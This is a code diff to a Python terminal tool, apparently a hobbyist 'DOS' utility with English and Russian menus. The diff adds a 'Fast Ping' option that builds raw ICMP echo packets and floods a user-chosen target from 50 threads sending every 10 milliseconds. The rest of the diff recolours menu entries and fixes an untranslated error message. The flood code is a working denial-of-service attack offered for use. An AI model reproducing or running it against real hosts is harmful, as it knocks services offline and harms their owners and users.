@@ -5,6 +5,8 @@ import random
 from datetime import datetime
 import threading
 import sys
+import struct
+import select
 
 GREEN = '\033[92m'
 RED = '\033[91m'
@@ -29,7 +31,7 @@ LANGUAGES = {
 | Github: github.com/SashaVoden
 """ + RESET,
         "menu_1": UI_TEXT + "1. Resolve domain to IP" + RESET,
-        "menu_2": UI_TEXT + "2. Start DOS script" + RESET,
+        "menu_2": GREEN + "2. Start DOS script" + RESET,  # теперь зелёным
         "menu_3": UI_TEXT + "3. Change language" + RESET,
         "menu_0": UI_TEXT + "0. Exit" + RESET,
         "select_option": UI_TEXT + "Select an option: " + RESET,
@@ -62,7 +64,7 @@ LANGUAGES = {
 | Github: github.com/SashaVoden
 """ + RESET,
         "menu_1": UI_TEXT + "1. Определить IP по домену" + RESET,
-        "menu_2": UI_TEXT + "2. Запустить DOS скрипт" + RESET,
+        "menu_2": GREEN + "2. Запустить DOS скрипт" + RESET,  # теперь зелёным
         "menu_3": UI_TEXT + "3. Сменить язык" + RESET,
         "menu_0": UI_TEXT + "0. Выход" + RESET,
         "select_option": UI_TEXT + "Выберите опцию: " + RESET,
@@ -269,14 +271,86 @@ def dino_game():
         if game_over:
             time.sleep(0.1)
 
+def calculate_checksum(source_string):
+    """Вычисляет контрольную сумму для ICMP пакета."""
+    countTo = (len(source_string) // 2) * 2
+    sum_ = 0
+    count = 0
+    while count < countTo:
+        thisVal = source_string[count + 1] * 256 + source_string[count]
+        sum_ = sum_ + thisVal
+        sum_ = sum_ & 0xffffffff
+        count += 2
+    if countTo < len(source_string):
+        sum_ += source_string[len(source_string) - 1]
+        sum_ = sum_ & 0xffffffff
+    sum_ = (sum_ >> 16) + (sum_ & 0xffff)
+    sum_ += (sum_ >> 16)
+    answer = ~sum_ & 0xffff
+    answer = socket.htons(answer)
+    return answer
+
+def icmp_ping(target):
+    """Отправляет ICMP (ping) запросы в цикле для одного потока."""
+    icmp_proto = socket.getprotobyname("icmp")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_proto)
+    except Exception as e:
+        print(RED + f"Failed to create raw socket: {e}" + RESET)
+        return
+    pid = os.getpid() & 0xFFFF
+    sequence = 1
+    while True:
+        # Формируем заголовок: type=8 (echo request), code=0, checksum=0, id, sequence
+        header = struct.pack("bbHHh", 8, 0, 0, pid, sequence)
+        data = struct.pack("d", time.time())
+        my_checksum = calculate_checksum(header + data)
+        header = struct.pack("bbHHh", 8, 0, my_checksum, pid, sequence)
+        packet = header + data
+        try:
+            sock.sendto(packet, (target, 1))
+        except Exception:
+            pass
+        sequence += 1
+        # Минимальная задержка для максимальной частоты пинга
+        time.sleep(0.01)
+
+def fast_ping_menu():
+    """Меню для запуска быстрого пинга"""
+    print_banner()
+    print_slow(GREEN + "Fast Ping" + RESET)
+    target = input(tr("ip_target"))
+    try:
+        ip = socket.gethostbyname(target)
+    except Exception as e:
+        print_slow(tr("error_resolve", e=str(e)))
+        return
+    print_slow(UI_TEXT + f"Starting fast ping on {ip}... (Ctrl+C to stop)" + RESET)
+    threads = []
+    num_threads = 50  # количество потоков
+    for i in range(num_threads):
+        t = threading.Thread(target=icmp_ping, args=(ip,))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print_slow(UI_TEXT + "\nStopping fast ping..." + RESET)
+        time.sleep(1)
+
 def main_menu():
     while True:
         clear_screen()
         print_banner()
         print_slow(tr("menu_1"))
-        print_slow(tr("menu_2"))
+        # Пункт DOS-скрипта выводим зелёным:
+        print_slow(GREEN + tr("menu_2").strip() + RESET)
         print_slow(tr("menu_3"))
-        print_slow("4. Play Dino Game")
+        print_slow(BLUE + "4. Play Dino Game" + RESET)
+        # Пункт Fast Ping выводим зелёным:
+        print_slow(GREEN + "5. Fast Ping" + RESET)
         print_slow(tr("menu_0"))
         choice = input("\n" + tr("select_option"))
         if choice == "1":
@@ -291,11 +365,14 @@ def main_menu():
         elif choice == "4":
             clear_screen()
             dino_game()
+        elif choice == "5":
+            clear_screen()
+            fast_ping_menu()
         elif choice == "0":
             print_slow(tr("goodbye"))
             break
         else:
-            print_slow(RED + "invalid_choice" + RESET)
+            print_slow(RED + tr("invalid_choice") + RESET)
             time.sleep(1)
 
 if __name__ == "__main__":
